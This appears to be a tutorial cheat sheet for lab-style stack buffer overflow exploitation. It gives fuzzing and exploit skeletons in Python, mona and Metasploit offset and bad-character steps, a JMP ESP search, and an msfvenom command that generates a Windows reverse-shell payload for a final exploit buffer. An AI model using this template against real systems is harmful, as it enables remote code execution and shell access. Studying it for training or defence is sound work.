## Steps:
1. Crash The Application
2. Find EIP and Control ESP
3. Identify Bad Characters 
4. Find JMP ESP
5. Generate Shell Code
6. Exploit

# 1. Crash the application 
Create a file called fuzz.py The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application. **Choose one of these versions.**

### Skeleton Version 1

```Python
#!/usr/bin/python 
import socket,sys

ip = '127.0.0.1'
port = 9999
buffer = []

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

### Skeleton Version 2

```Python
    #!/usr/bin/python 
    import socket, time, sys

    ip = "127.0.0.1"
    port = 9999
    timeout = 5

    # Create an array of increasing length buffer strings.
    buffer = []
    counter = 100
    while len(buffer) < 30:
        buffer.append("A" * counter)
        counter += 100

    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            s.send("USER username\r\n")
            s.recv(1024)

            print("Fuzzing PASS with %s bytes" % len(string))
            s.send("PASS " + string + "\r\n")
            s.recv(1024)
            s.send("QUIT\r\n")
            s.recv(1024)
            s.close()
        except:
            print("Could not connect to " + ip + ":" + str(port))
            sys.exit(0)
        time.sleep(1)
```

# 2. Find EIP and control ESP

We are able to establish that we are able to crash the application with a relative number of bytes. Now we need to identify the exact number bytes that it takes to fill the buffer. Metasploit provides a ruby script called pattern_create.rb that will create a unique string with no repeating characters. After we send this payload to the buffer, it will display what the offset is which we'll use for the next step in finding the EIP.

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 666 (Change 666 to the value that crashed the server) 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...
```

Create a new script called exploit.py
You take the unique string character created and that becomes your new buffer in exploit.py 


### Skeleton

```Python
#!/usr/bin/python 
import socket

ip = "10.0.0.1"
port = 21

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2..."
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Send that payload to the application, make sure it crashed and grab the EIP value in the debugger.

Now, we have 3 methods to find the offset:


## Method 1

Use mona's findmsp command, with the distance argument set to the pattern length.

    ...
    !mona findmsp -distance 666
    
    [+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
    Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
    Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
    **EIP contains normal pattern : 0x78413778 (offset 112)**
    ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
    EAX (0x017df764) points at offset 0 in normal pattern (length 600)
    EBP contains normal pattern : 0x41367841 (offset 108)
    ...
NOTE: Mona should display a log window with the output of the command. If not, click "Window" menu and then "Log Data" to view it (Choose "CPU" to switch back to the standard view)

## Method 2

We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 

```
root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q pasteESPvaluehere -l 666
[*] Exact match at offset 112
```
## Method 3

You can also use these web generator to find the offset:
1. https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
2. https://wiremask.eu/tools/buffer-overflow-pattern-generator/


# 3. Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

```
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff. Called badchars.py

```
 #!/usr/bin/env python
 from __future__ import print_function

 for x in range(1, 256):
     print("\\x" + "{:02x}".format(x), end='')

 print()
```

Create a new buffer using this information to ensure that we can control EIP:

```
 prefix = ""
 offset = 112
 overflow = "A" * offset
 retn = "BBBB"
 padding = ""
 payload = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
 postfix = ""
    
 buffer = prefix + overflow + retn + padding + payload + postfix
```

Restart Immunity and run the exploit.py again. Then, use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

```
!mona compare -f C:\mona\appname\bytearray.bin -a <address> (ESP address and remember change the path of the appin "appname")
```

Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.


# 4. Finding a Jump Point
Find a jump point (Search de addres to set on the exploit in the "retn" part).
The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

```
!mona jmp -r esp -cpb "\x00\x0a\x0d" (change "\x00\x0a\x0d" value)
```

# 5. Generate Shell Code

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0IP LPORT=NetcatPort EXITFUNC=thread -b "\x00\x0a\x0d" -f c
```
or

```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0IP LPORT=NetcatPort EXITFUNC=thread -b "\x00\x0a\x0d" -f python
```

### Prepend NOPs

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.

```
padding = "\x90" * 16
```

### Final Buffer

```
 prefix = ""
 offset = 112
 overflow = "A" * offset
 retn = "\x56\x23\x43\x9A" # Jump Poit Found
 padding = "\x90" * 16 # NOPs
 payload = "\xdb\xde\xba\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1..." #Shell Code script generated
 postfix = ""
    
 buffer = prefix + overflow + retn + padding + payload + postfix
```

# 6. Exploit it!


